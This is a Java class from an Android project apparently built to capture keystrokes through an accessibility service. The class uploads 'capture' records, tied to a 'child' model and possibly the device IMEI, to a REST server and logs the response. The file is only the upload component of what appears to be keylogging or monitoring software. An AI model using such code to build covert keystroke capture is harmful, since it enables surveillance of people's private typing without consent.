package com.example.keyboard_capture.utility;

import android.os.Build;
import android.util.Log;
import android.widget.TextView;

import androidx.annotation.RequiresApi;

import com.example.keyboard_capture.MainActivity;
import com.example.keyboard_capture.MyAccessibilityService;
import com.example.keyboard_capture.api.retrofit.RestApiAdapter;
import com.example.keyboard_capture.model.Captura;
import com.example.keyboard_capture.model.Hijo;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class CapsuledCaptured {

    private final String TAG = "caputureLOG";
    private TextView tt = MainActivity.captureView;
    //private static Captura captura;
    private Captura captura;

    public CapsuledCaptured(Captura captura) {
        this.captura = captura;
    }

    public void callPostDataCapture(final String dataSend){
        //Esto es horrible cambiarlo por una sola instancia -- objeto global y unico buscarlo en la arqutectura
        RestApiAdapter restApiAdapter = new RestApiAdapter();

        //Hacer inyeccion de dependencias para reutilizar el mismo objeto y no saturar la memoria con una nuva instancia.
        //imei = constants.getIMEI();
        final String[] request = {""};
        restApiAdapter
                .getClientService()
                .newCapture(captura)
                .enqueue(new Callback<Captura>() {
                    @RequiresApi(api = Build.VERSION_CODES.O)
                    @Override
                    public void onResponse(Call<Captura> call, Response<Captura> response) {
                        //MyAccessibilityService.resolveMain = response.body().toString();
                        tt.setText(dataSend +"-->"+ response.body().request());
                        Log.i(TAG,"capture_final " + response.body().toString() + "==> u_u");
                    }
                    @Override
                    public void onFailure(Call<Captura> call, Throwable t) {
                        Log.i(TAG,"request: Error :(");
                    }
                });

    }
}
